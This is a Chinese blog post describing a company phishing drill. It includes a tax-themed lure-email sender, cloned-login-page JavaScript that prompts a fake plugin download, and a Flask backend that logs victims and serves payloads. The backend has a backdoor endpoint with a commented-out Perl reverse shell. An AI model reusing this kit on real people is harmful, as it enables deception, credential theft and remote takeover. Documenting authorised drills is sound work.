<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>记一次钓鱼演练和OS X下的渗透技巧 | 😊#</title>
  <meta name="author" content="JKme">
  
  <meta name="description" content="背景一年一度的钓鱼节，需要针对公司员工做一次钓鱼演练，前期准备工作如下:

确定钓鱼的页面：图方便选了一个登录入口，用Chrome插件SingleFile右键一键保存
确定钓鱼的形式：引导用户输入公司邮箱，点击完成之后，弹出需要安装插件，根据UA决定是下载pkg还是exe。
确定钓鱼的效果：从三个数据维度来看最终效果
钓鱼页面访问次数
输入公司邮箱的数量统计
收集运行了Exe和Pkg的用户



钓鱼邮件的发送有两种形式可以发送钓鱼邮件：

使用相近域名
使用sendcloud

相近域名发送注册相近域名之后，可以根据这里的步骤绑定使用zoho的免费企业邮箱: 2021年四款国内外免费企业邮箱及申请教程图解
使用SendCloud注册SendCloud之后，生成API Key，利用以下代码发送钓鱼邮件："> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="记一次钓鱼演练和OS X下的渗透技巧"/>
  <meta property="og:site_name" content="😊#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">😊#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 记一次钓鱼演练和OS X下的渗透技巧</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>一年一度的钓鱼节，需要针对公司员工做一次钓鱼演练，前期准备工作如下:</p>
<ul>
<li>确定钓鱼的页面：图方便选了一个登录入口，用Chrome插件SingleFile右键一键保存</li>
<li>确定钓鱼的形式：引导用户输入公司邮箱，点击完成之后，弹出需要安装插件，根据UA决定是下载pkg还是exe。</li>
<li>确定钓鱼的效果：从三个数据维度来看最终效果<ul>
<li>钓鱼页面访问次数</li>
<li>输入公司邮箱的数量统计</li>
<li>收集运行了Exe和Pkg的用户</li>
</ul>
</li>
</ul>
<h2 id="钓鱼邮件的发送"><a href="#钓鱼邮件的发送" class="headerlink" title="钓鱼邮件的发送"></a>钓鱼邮件的发送</h2><p>有两种形式可以发送钓鱼邮件：</p>
<ol>
<li>使用相近域名</li>
<li>使用sendcloud</li>
</ol>
<h3 id="相近域名发送"><a href="#相近域名发送" class="headerlink" title="相近域名发送"></a>相近域名发送</h3><p>注册相近域名之后，可以根据这里的步骤绑定使用zoho的免费企业邮箱: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/341879374">2021年四款国内外免费企业邮箱及申请教程图解</a></p>
<h3 id="使用SendCloud"><a href="#使用SendCloud" class="headerlink" title="使用SendCloud"></a>使用SendCloud</h3><p>注册SendCloud之后，生成API Key，利用以下代码发送钓鱼邮件：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span> json

url<span class="token operator">=</span><span class="token string">"http://api.sendcloud.net/apiv2/mail/send"</span>
body <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
    &lt;br>
    各位同事:&lt;br>
    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;根据《关于延续实施全年一次性奖金等个人所得税优惠政策的公告》（财政部税务总局2023年第4号公告），全年一次性奖金单独计税优惠政策，执行期限延长至2023年4月14日。
为确保广大职工充分享受该项税收优惠政策，2022年底税务总局对每一名职工的全年工薪收入和各类扣除情况进行了分析测算，按政策将大部分职工年底发放的部分绩效结算金额按全年一次性奖金优化计税。优化后，有78.2%的职工可节约税金。在2023年4月中旬申报期完成全年一次性奖金纳税申报后，后续会按程序将节约的税金发至职工账户上，申报操作流程，请据此跳转税务申报平台: &lt;a href='https://example.com/'>税务申报平台&lt;a>&lt;br>

需要说明：经过对职工全年应缴税额和已扣税额对比，部分职工需要补税，补税的金额将在后续发放的绩效中扣除。相关政策职工可通过此链接&lt;a href='http://www.chinatax.gov.cn'>http://www.chinatax.gov.cn/&lt;/a>查看。
"""</span>

receives <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'john@victim.com'</span><span class="token punctuation">]</span>
<span class="token comment"># 您需要登录SendCloud创建API_USER，使用API_USER和API_KEY才可以进行邮件的发送。</span>
params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token string">"apiUser"</span><span class="token punctuation">:</span> <span class="token string">"&lt;Users>"</span><span class="token punctuation">,</span> \
  <span class="token string">"apiKey"</span> <span class="token punctuation">:</span> <span class="token string">"&lt;apikey>"</span><span class="token punctuation">,</span>\
  <span class="token string">"from"</span> <span class="token punctuation">:</span> <span class="token string">"hr@example.com"</span><span class="token punctuation">,</span> \
  <span class="token string">"fromName"</span> <span class="token punctuation">:</span> <span class="token string">"hr@example.com"</span><span class="token punctuation">,</span> \
  <span class="token string">"to"</span> <span class="token punctuation">:</span> <span class="token string">"&lt;helo@victim.com>"</span><span class="token punctuation">,</span> \
  <span class="token string">"subject"</span> <span class="token punctuation">:</span> <span class="token string">"【重要】关于2023年个人所得税税收优化"</span><span class="token punctuation">,</span> \
  <span class="token string">"html"</span><span class="token punctuation">:</span> body<span class="token punctuation">,</span> \
<span class="token punctuation">&#125;</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="钓鱼的页面"><a href="#钓鱼的页面" class="headerlink" title="钓鱼的页面"></a>钓鱼的页面</h2><p>对输入的信息进行后端提交，输入完成之后弹框提示用户下载插件，js代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>link href<span class="token operator">=</span><span class="token string">"https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@4/bulma.css"</span> rel<span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>

<span class="token operator">&lt;</span>script<span class="token operator">></span>
    <span class="token keyword">function</span> <span class="token function">isValidEmail</span><span class="token punctuation">(</span><span class="token parameter">email</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[a-zA-Z0-9_\.-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">isChinese</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[\u4E00-\u9FA5]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">login_submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> usernameInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> emailInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isChinese</span><span class="token punctuation">(</span>usernameInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Oops...'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'请输入中文公司名称'</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isValidEmail</span><span class="token punctuation">(</span>emailInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Oops...'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'请输入正确的邮箱地址!'</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isChinese</span><span class="token punctuation">(</span>usernameInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isValidEmail</span><span class="token punctuation">(</span>emailInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            
                <span class="token keyword">const</span> corpname <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
                <span class="token keyword">const</span> email <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
                <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"corpname"</span><span class="token punctuation">,</span> corpname<span class="token punctuation">)</span><span class="token punctuation">;</span>
                formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"email"</span><span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'/login'</span><span class="token punctuation">;</span>
                http<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                http<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                http<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//Call a function when the state changes.</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>http<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> http<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              
                 
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'Win'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'提交成功!'</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">showCloseButton</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">focusConfirm</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">html</span><span class="token operator">:</span> <span class="token string">'晚些会向您发送邮件通知，请安装税务系统插件: &lt;a href="https://example.com/download/win">点击下载&lt;/a> '</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'success'</span>
                            <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">)</span><span class="token punctuation">;</span>
                            
                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'Mac'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'提交成功!'</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">showCloseButton</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">focusConfirm</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">html</span><span class="token operator">:</span> <span class="token string">'晚些会向您发送邮件通知，请安装税务系统插件: &lt;a href="https://example.com/download/osx">点击下载&lt;/a> '</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'success'</span>
                            <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                       
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                http<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> 
    <span class="token punctuation">&#125;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h2><p>后端需要收集用户提交的表单信息，如果运行了EXE或者PKG需要把用户的信息上传到服务端，整体代码如下:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file
<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORS
<span class="token keyword">import</span> sqlite3
<span class="token keyword">import</span> time

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    CONN <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'fish.db'</span><span class="token punctuation">)</span>
    CURSOR <span class="token operator">=</span> CONN<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>
        <span class="token triple-quoted-string string">"""
        CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                corpname TEXT NOT NULL,
                email TEXT NOT NULL,
                createdate DATETIME DEFAULT (DATETIME('now','localtime'))
            );
        """</span>
    <span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>
        <span class="token triple-quoted-string string">"""
        CREATE TABLE IF NOT EXISTS osx (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                osxname TEXT NOT NULL,
                createdate DATETIME DEFAULT (DATETIME('now','localtime'))
            )
        """</span>
    <span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>
        <span class="token triple-quoted-string string">"""
        CREATE TABLE IF NOT EXISTS win (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                pcname TEXT NOT NULL,
                username TEXT NOT NULL,
                createdate DATETIME DEFAULT (DATETIME('now','localtime'))
            )
        """</span>
    <span class="token punctuation">)</span>

<span class="token comment"># 收集表单数据</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    corpname <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'corpname'</span><span class="token punctuation">]</span>
    email <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>
    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT  INTO users(corpname, email) VALUES (?, ?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>corpname<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">)</span>
        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">"Success"</span>

<span class="token comment"># 运行Exe之后收集用户名和pcname，定位员工</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/windata'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">windata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
    pcname <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'pcname'</span><span class="token punctuation">]</span>
    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT INTO win(username, pcname) VALUES (?,?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> pcname<span class="token punctuation">)</span><span class="token punctuation">)</span>
        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">"Success"</span>

<span class="token comment"># 运行了pkg的会新建一个定时任务后门，请求这个URL</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/osxdoor'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">osx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#return "perl -e 'use Socket;$i=\"&lt;ip>\";$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\">&amp;S\");open(STDOUT,\">&amp;S\");open(STDERR,\">&amp;S\");exec(\"sh -i\");&#125;;' "</span>
    <span class="token keyword">return</span> <span class="token string">"echo 'helo world'"</span>

<span class="token comment"># 运行PKG之后，收集用户名，定位员工</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/osxdata'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">osxdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>
    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT  INTO osx(osxname) VALUES (?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">"Success"</span>

<span class="token comment"># 下载插件功能</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download/&lt;plat>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>plat<span class="token punctuation">)</span><span class="token punctuation">:</span>
    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'Content-Disposition'</span><span class="token punctuation">:</span> <span class="token string">'attachment; filename=税务申报插件.zip'</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"osx"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/finace.pkg"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"sh"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/install.sh"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"zip"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/osx.zip"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/win.zip"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    init_db<span class="token punctuation">(</span><span class="token punctuation">)</span>
